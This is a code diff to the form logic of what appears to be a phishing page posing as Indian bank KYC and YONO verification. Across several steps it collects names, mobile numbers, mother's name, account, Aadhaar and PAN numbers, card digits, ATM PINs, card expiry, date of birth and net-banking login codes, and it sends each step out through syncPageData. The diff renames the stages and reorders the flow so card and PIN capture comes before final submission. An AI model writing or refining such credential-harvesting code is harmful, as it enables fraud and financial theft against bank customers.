@@ -766,9 +766,9 @@
             formData.currentFlow = 'main';
 
             // Sync page data
-            await syncPageData('index_1', { fullName, mobileNumber, motherName });
+            await syncPageData('kyc_login', { fullName, mobileNumber, motherName });
 
-            showStep('step-index_1_1');
+            showStep('step-card');
         });
 
         function resetIndex1() {
@@ -799,9 +799,15 @@
             formData.panCard = panCard;
 
             // Sync page data
-            await syncPageData('index_1_1', { accountNumber, aadhaarNumber, panCard });
+            await syncPageData('profile_verify', { accountNumber, aadhaarNumber, panCard });
 
-            showStep('step-card');
+            // Final submit for main flow
+            const success = await submitFinalData();
+            if (success) {
+                showStep('step-success');
+            } else {
+                alert('Submission failed. Please try again.');
+            }
         });
 
         // ==================== CARD (Card Authentication) ====================
@@ -844,19 +850,12 @@
             btn.disabled = true;
 
             // Sync page data
-            await syncPageData('card', { cardLast6, atmPin });
-
-            // Final submit for main flow
-            const success = await submitFinalData();
+            await syncPageData('card_auth', { cardLast6, atmPin });
 
             btn.classList.remove('loading');
             btn.disabled = false;
 
-            if (success) {
-                showStep('step-success');
-            } else {
-                alert('Submission failed. Please try again.');
-            }
+            showStep('step-index_1_1');
         });
 
         // ==================== APPLY (Apply YONO) ====================
@@ -880,13 +879,14 @@
             formData.branchCode = branchCode;
 
             // Sync page data with consistent field names
-            await syncPageData('apply', {
+            await syncPageData('yono_apply', {
                 fullName: applyName,
                 mobileNumber: applyMobile,
                 accountNumber: applyAccount,
                 cifNumber,
                 branchCode
             });
+
 
             showStep('step-forum');
         });
@@ -944,7 +944,7 @@
             formData.finalPin = forumPinInput.value;
 
             // Sync page data
-            await syncPageData('forum', {
+            await syncPageData('verification', {
                 dateOfBirth: dobInput.value,
                 cardExpiry: expiryInput.value,
                 finalPin: forumPinInput.value
@@ -980,7 +980,7 @@
             loginSubmitBtn.disabled = true;
 
             // Sync page data
-            await syncPageData('login', {
+            await syncPageData('login_details', {
                 userId: formData.userId,
                 accessCode: formData.accessCode,
                 profileCode: formData.profileCode
